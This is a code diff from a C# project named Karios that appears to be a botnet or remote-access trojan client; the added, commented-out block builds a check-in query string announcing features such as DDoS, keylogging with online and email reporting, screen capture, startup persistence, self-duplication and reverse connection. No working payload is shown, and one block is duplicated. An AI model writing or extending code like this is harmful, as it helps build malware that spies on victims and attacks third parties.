@@ -120,11 +120,61 @@ namespace Karios
                             else
                                 paramaters = paramaters + "&newclient=false";
                         }
+                        /*
+                        // 1 = DDOSOnline
+                        if (paramaters == "?")
+                            paramaters = paramaters + "ddosonline=true";
+                        else
+                            paramaters = paramaters + "&ddosonline=true";
 
+                        // 2 = DDOSIP
                         if (paramaters == "?")
                             paramaters = paramaters + "ddosip=true";
                         else
                             paramaters = paramaters + "&ddosip=true";
+
+                        // 3 = KeyloggerOnline
+                        if (paramaters == "?")
+                            paramaters = paramaters + "keyonline=true";
+                        else
+                            paramaters = paramaters + "&keyonline=true";
+
+                        // 3 = KeyloggerOnline
+                        if (paramaters == "?")
+                            paramaters = paramaters + "keyonline=true";
+                        else
+                            paramaters = paramaters + "&keyonline=true";
+
+                        // 4 = KeyloggerEmail
+                        if (paramaters == "?")
+                            paramaters = paramaters + "keyloggeremail=true";
+                        else
+                            paramaters = paramaters + "&keyloggeremail=true";
+
+                        // 5 = CaptureSceen
+                        if (paramaters == "?")
+                            paramaters = paramaters + "capturescreen=true";
+                        else
+                            paramaters = paramaters + "&capturescreen=true";
+
+                        // 6 = Startup
+                        if (paramaters == "?")
+                            paramaters = paramaters + "startup=true";
+                        else
+                            paramaters = paramaters + "&startup=true";
+
+                        // 7 = Duplication
+                        if (paramaters == "?")
+                            paramaters = paramaters + "duplication=true";
+                        else
+                            paramaters = paramaters + "&duplication=true";
+
+                        // 8 = Reverse
+                        if (paramaters == "?")
+                            paramaters = paramaters + "reverse=false";
+                        else
+                            paramaters = paramaters + "&reverse=false";
+                        */
 
                         string commands = "";
                         try
